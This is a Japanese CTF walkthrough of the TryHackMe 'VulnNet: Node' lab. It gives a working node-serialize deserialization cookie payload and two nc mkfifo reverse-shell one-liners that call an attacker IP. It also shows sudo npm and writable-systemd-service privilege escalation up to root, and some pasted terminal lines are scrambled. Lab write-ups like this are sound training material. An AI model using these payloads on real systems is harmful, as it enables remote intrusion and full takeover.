# VulnNet: Node
- https://tryhackme.com/room/vulnnetnode

# 攻撃概要
1. ポートスキャン
1. クッキーの挙動から脆弱性を確認
1. 脆弱性を利用してRCE
1. sudoの設定不備をついて別ユーザに変更
1. sudoの設定不備をついて権限昇格



# ポートスキャン
- 8080だけ空いていることを確認
```
─# nmap -Pn -sV -sC -T4 thm_target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 12:12 JST
Nmap scan report for thm_target (10.10.37.85)
Host is up (0.30s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.92 seconds
```

# クッキーの挙動から脆弱性を確認
- 8080にアクセスするとホームページが表示される
```
http://thm_target:8080/
```

- 文章から、nodeの脆弱性がありそうなことが示唆されている
```
Node.js vulnerabilities still present this times
```
- クッキーとして保存されている値から、認証情報のような値を保持していることを確認

```
GET / HTTP/1.1

Host: thm_target:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D

Upgrade-Insecure-Requests: 1

If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
```

- セッションの末尾が%3D%3D（==）のbase64ぽい
```
session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
```
- 認証情報を保持していることを確認
```
└─# echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ=="|base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"} 
```

- GuetをAdminに変更すると値が変わるが、権限が変更されるわけでもない

```
└─# echo '{"username":"Admin","isGuest":false,"encoding": "utf-8"}'|base64
eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0K 
```
```
Welcome, Admin
```

- クッキー自体を適当な値に返るとエラーが表示され、エラー内容からクッキーの値をデシリアライズしていることがわかる

```
SyntaxError: Unexpected token � in JSON at position 0
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

- ここからデシリアライズに関する脆弱性がないか確認
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

# 脆弱性を利用してRCE
- 重要な部分は、execの中身のようなので、中身をリバースシェルに書き換え


```
└─# vi deserialize_attack.txt       
                                                                                      
┌──(root💀kali)-[~/vulnNet_Node]
└─# cat deserialize_attack.txt     
{"username":"_$$ND_FUNC$$_function (){\n require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.82 1234 >/tmp/f', function(error, stdout, stderr) {console.log(stdout) });\n }()","isGuest":false,"encoding": "utf-8"}
                                                                                      
┌──(root💀kali)-[~/vulnNet_Node]
└─# cat deserialize_attack.txt|base64
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiByZXF1aXJlKCdjaGlsZF9w
cm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3No
IC1pIDI+JjF8bmMgMTAuOS4xLjgyIDEyMzQgPi90bXAvZicsIGZ1bmN0aW9uKGVycm9yLCBzdGRv
dXQsIHN0ZGVycikge2NvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIiwiaXNHdWVzdCI6ZmFs
c2UsImVuY29kaW5nIjogInV0Zi04In0K

```

- 攻撃端末側で待機していると繋ぎなおしてくる

```
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.9.1.82] from (UNKNOWN) [10.10.37.85] 42028
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www
$ cat /etc/passwd
serv-manage:x:1000:1000:serv-manage,,,:/home/serv-manage:/bin/bash
www:x:1001:1001:,,,:/home/www:/bin/bash

```


# sudoの設定不備をついて別ユーザに変更

- sudo -lをすると、super

```
$ sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm

```

- gtfobinで確認
    - https://gtfobins.github.io/gtfobins/npm/
    - 途中権限がないと怒られたので、えいやーで777に設定
```
$ TF=$(mktemp -d)
$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
$ chmod -R 777 $TF
$ sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.45XOApCBKe
> /bin/sh

whoami
serv-manage
ls /home/serv-manage
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
user.txt
Videos
```

# sudoの設定不備をついて権限昇格
- sudo -lを確認するとrootで実行しているサービスが見つかる

```
​sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
locate vulnnet-job.service
/etc/systemd/system/vulnnet-job.service
   
cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

- serv-manageに書き込み権限が付与されている
```
ls -al /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

- reverseshellを作成(履歴消えたので結果のみ表示)
```
serv-manage@vulnnet-node:/tmp/tmp.45XOApCBKe$ cat /tmp/reverse.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.82 4321 >/tmp/f

```

- serviceからreverseshellを呼ぶように書き換え
```
to.timerage@vulnnet-node:/tmp/tmp.45XOApCBKe$ cat /etc/systemd/system/vulnnet-aut
[Unit]                                                                                                         
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target

```

- サービス呼び出し
```
ulnnet-auto.timeret-node:/tmp/tmp.45XOApCBKe$ sudo -u root /bin/systemctl stop vu
vulnnet-auto.timert-node:/tmp/tmp.45XOApCBKe$ sudo -u root /bin/systemctl start v
```

- rootでリバースシェル完了
```
└─# nc -lnvp 4321         
listening on [any] 4321 ...
connect to [10.9.1.82] from (UNKNOWN) [10.10.66.68] 54790
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

```
